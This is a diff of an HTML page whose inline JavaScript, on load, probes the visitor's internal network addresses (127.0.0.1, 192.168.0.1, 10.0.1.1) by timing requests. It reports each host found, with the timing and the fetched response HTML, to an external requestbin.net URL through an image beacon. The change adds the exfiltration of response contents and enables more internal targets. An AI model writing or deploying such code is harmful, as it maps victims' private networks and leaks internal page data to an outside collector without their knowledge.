@@ -8,7 +8,7 @@
   </head>
   <body>   
     <script>
-    var LOG_URL = "http://d7ipw0p9hhinwnq6.b.requestbin.net";
+    var LOG_URL = "http://eax28hix4vcs2lpe.b.requestbin.net";
     var discoveredHosts = [];
     var timeout = 1000; //1 sec
       let a = new Image();
@@ -27,6 +27,7 @@
         {
           var time = new Date().getTime() - d.getTime();
           var aborted = false;
+          var html = xhr.responseText;
 
           xhr.onabort = function()
           {
@@ -41,7 +42,7 @@
               {
                 //console.log('Host Found -> ' + host + ' in ' + time + ' ms');
                 let imgLog = new Image();
-                imgLog.src = LOG_URL + "?IP=" + host + "&time=" + time;
+                imgLog.src = LOG_URL + "?IP=" + host + "&time=" + time+"&HTML="+html;
                 discoveredHosts.push(host);
               }
             }
@@ -147,8 +148,8 @@
     }*/
 
     doRequest("127.0.0.1");
-    //  doRequest("192.168.0.1");
-     // doRequest("10.0.1.1");
+    doRequest("192.168.0.1");
+    doRequest("10.0.1.1");
      // doRequest("10.1.1.1");
 
     </script>
